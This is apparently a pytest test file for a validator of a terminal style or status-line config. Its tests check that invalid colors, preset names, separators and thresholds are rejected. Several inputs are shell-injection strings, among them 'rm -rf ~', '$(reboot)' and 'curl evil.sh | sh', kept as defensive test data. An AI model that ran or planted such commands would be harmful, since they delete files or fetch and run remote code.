import pytest

from claude_style.presets import PRESETS
from claude_style.render import render
from claude_style.schemes import scheme_config
from claude_style.validate import ConfigError, validate_config


def test_default_config_is_valid(config):
    validate_config(config)


@pytest.mark.parametrize("name", list(PRESETS))
def test_every_builtin_preset_is_valid(name):
    validate_config(scheme_config(name))


@pytest.mark.parametrize("bad", [256, -1, True, "61", "1; rm -rf ~", None, 1.5])
def test_rejects_color_that_is_not_an_int_0_to_255(config, bad):
    config["segments"]["dir"]["bg"] = bad
    with pytest.raises(ConfigError, match="segments.dir.bg"):
        validate_config(config)


def test_rejects_preset_name_that_would_break_out_of_the_script_comment(config):
    config["preset"] = "x\ntouch /tmp/pwned"
    with pytest.raises(ConfigError, match="invalid name"):
        validate_config(config)


def test_rejects_unknown_separator(config):
    config["separator"] = "$(reboot)"
    with pytest.raises(ConfigError, match="separator"):
        validate_config(config)


def test_rejects_missing_threshold_color(config):
    config["segments"]["context"]["thresholds"] = [[60, 28], [85, 178]]
    with pytest.raises(ConfigError, match="thresholds"):
        validate_config(config)


def test_rejects_non_numeric_cost_threshold(config):
    config["segments"]["cost"]["warn_threshold_usd"] = "5; id"
    with pytest.raises(ConfigError, match="warn_threshold_usd"):
        validate_config(config)


def test_render_refuses_an_invalid_config(config):
    config["segments"]["model"]["fg"] = "255; curl evil.sh | sh"
    with pytest.raises(ConfigError):
        render(config)
